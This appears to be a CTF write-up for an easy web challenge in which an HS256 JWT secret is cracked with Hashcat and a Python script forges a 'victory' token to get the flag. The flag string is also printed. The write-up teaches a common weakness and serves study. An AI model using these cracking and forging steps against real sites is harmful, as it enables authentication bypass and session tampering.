---
title: "w3ak"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: easy
author: "L-BOH"
---

# w3ak

## Summary

The site uses a JWT to remember game progress. Its HMAC secret is a weak, publicly searchable value, so we can crack it with Hashcat and forge a winning token.

## Root cause

The deployment sets the JWT key to the weak value gameking. The application then signs and trusts game status in the token:

~~~python
token = jwt.encode({'user_id': user[0], 'game-status': 'playing'},
                   app.config['SECRET_KEY'], algorithm='HS256')
...
data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
if data.get('game-status') == 'victory':
    return render_template('game.html', message=f"... {FLAG}")
~~~

HS256 uses the same secret to sign and verify. Once Hashcat finds the weak secret, an attacker can create a valid signature for a token whose game status is victory.

## Vulnerability

After logging in, the browser receives an HS256 JWT cookie. The token payload includes a game-status value. HS256 only protects that data if its shared secret is strong and private; a short human-chosen secret can be recovered offline from the token signature.

## Exploit

1. Register and log in with any account. Copy the value of the token cookie into jwt.txt.
2. Crack it with Hashcat and the SecLists scraped JWT secrets wordlist:

~~~bash
hashcat -m 16500 jwt.txt /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
~~~

Hashcat recovers:

~~~text
gameking
~~~

3. Sign a replacement token with a victory game status. Use the ID of an account that exists; ID 1 is convenient if you registered first.

~~~python
import datetime
import jwt

claims = {
    "user_id": 1,
    "username": "attacker",
    "game-status": "victory",
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),
}
print(jwt.encode(claims, "gameking", algorithm="HS256"))
~~~
or just use jwt.io to forge the token.

4. Replace the token cookie with the generated value and revisit /game. The forged game status is accepted and the flag is displayed.

## Flag

~~~text
Securinets{n3ver_use_w3ak_jwt_secre7}
~~~
